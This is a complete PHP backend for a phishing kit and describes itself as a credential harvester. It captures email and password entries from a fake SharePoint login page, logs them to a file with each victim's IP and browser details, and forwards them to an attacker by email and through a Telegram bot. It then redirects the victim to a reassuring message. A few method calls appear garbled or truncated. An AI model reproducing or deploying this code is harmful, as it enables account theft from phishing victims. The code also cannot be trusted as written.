<?php
// _mail.php - Credential harvester with SMTP + Telegram forwarding
error_reporting(0);
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $password = trim($_POST['password'] ?? '');
    
    if ($email && $password) {
        // Log to file (backup)
        $log_entry = date('Y-m-d H:i:s') . " | Email: $email | Password: $password | IP: {$_SERVER['REMOTE_ADDR']} | UA: " . ($_SERVER['HTTP_USER_AGENT'] ?? '') . "\n";
        file_put_contents('creds.txt', $log_entry, FILE_APPEND | LOCK_EX);
        
        //  via SMTP
        ViaSMTP($email, $password);
        
        //  via Telegram Bot
        ToTelegram($email, $password);
        
        // Redirect with success (keeps phishing page clean)
        header('Location: index.html?success=' . urlencode('Access granted! Files downloading...'));
        exit;
    }
}

// SMTP Configuration - UPDATE THESE
function ViaSMTP($email, $password) {
    $smtp_config = [
        'host' => 'smtp.gmail.com',        // Your SMTP server
        'port' => 587,                     // 587=STARTTLS, 465=SSL, 25=unencrypted
        'username' => 'your@gmail.com',    // Your SMTP username
        'password' => 'your_app_password', // App password (not regular password)
        'secure' => 'tls',                 // 'tls', 'ssl', or false
        'from_email' => 'your@gmail.com',
        'from_name' => 'SharePoint Service',
        'to_email' => 'attacker@yourdomain.com'  // Where creds get sent
    ];
    
    $subject = "🎯 SharePoint Credentials Captured";
    $message = "New credentials harvested:\n\n";
    $message .= "📧 Email: $email\n";
    $message .= "🔑 Password: $password\n";
    $message .= "🌐 IP: {$_SERVER['REMOTE_ADDR']}\n";
    $message .= "📱 User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'N/A') . "\n";
    $message .= "🕐 Time: " . date('Y-m-d H:i:s T') . "\n";
    $message .= "🔗 URL: " . ($_SERVER['HTTP_REFERER'] ?? 'Direct') . "\n\n";
    
    $headers = [
        'From' => $smtp_config['from_name'] . ' <' . $smtp_config['from_email'] . '>',
        'Reply-To' => $smtp_config['from_email'],
        'X-Mailer' => 'PHP/' . phpversion(),
        'Content-Type' => 'text/plain; charset=UTF-8'
    ];
    
    // Use PHPMailer if available, fallback to mail()
    if (class_exists('PHPMailer\PHPMailer\PHPMailer')) {
        require_once 'PHPMailer/src/PHPMailer.php';
        require_once 'PHPMailer/src/SMTP.php';
        require_once 'PHPMailer/src/Exception.php';
        
        $mail = new PHPMailer\PHPMailer\PHPMailer(true);
        try {
            $mail->isSMTP();
            $mail->Host       = $smtp_config['host'];
            $mail->SMTPAuth   = true;
            $mail->Username   = $smtp_config['username'];
            $mail->Password   = $smtp_config['password'];
            $mail->SMTPSecure = PHPMailer\PHPMailer\PHPMailer::ENCRYPTION_STARTTLS;
            $mail->Port       = $smtp_config['port'];
            $mail->setFrom($smtp_config['from_email'], $smtp_config['from_name']);
            $mail->addAddress($smtp_config['to_email']);
            $mail->Subject = $subject;
            $mail->Body    = $message;
            $mail->();
        } catch (Exception $e) {
            error_log("SMTP Error: {$mail->ErrorInfo}");
        }
    } else {
        // Fallback to PHP mail()
        mail($smtp_config['to_email'], $subject, $message, implode("\r\n", array_map(function($k,$v){return "$k: $v";}, array_keys($headers), $headers)));
    }
}

// Telegram Bot Configuration - UPDATE THESE
function ToTelegram($email, $password) {
    $bot_token = 'YOUR_BOT_TOKEN_HERE';  // https://t.me/BotFather
    $chat_id = 'YOUR_CHAT_ID_HERE';      // Your Telegram chat ID
    
    if (!$bot_token || $bot_token === 'YOUR_BOT_TOKEN_HERE') return;
    
    $message = "🎯 *SharePoint Credentials*\n\n";
    $message .= "📧 *Email:* `$email`\n";
    $message .= "🔑 *Password:* `$password`\n";
    $message .= "🌐 *IP:* `{$_SERVER['REMOTE_ADDR']}`\n";
    $message .= "📱 *User-Agent:* `".substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 100)."`\n";
    $message .= "🕐 *Time:* " . date('Y-m-d H:i:s T');
    
    $url = "https://api.telegram.org/bot{$bot_token}/Message";
    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    file_get_contents($url, false, stream_context_create($options));
}

// Error redirect (if no POST data)
header('Location: index.html?error=' . urlencode('Network error, try again'));
exit;
?>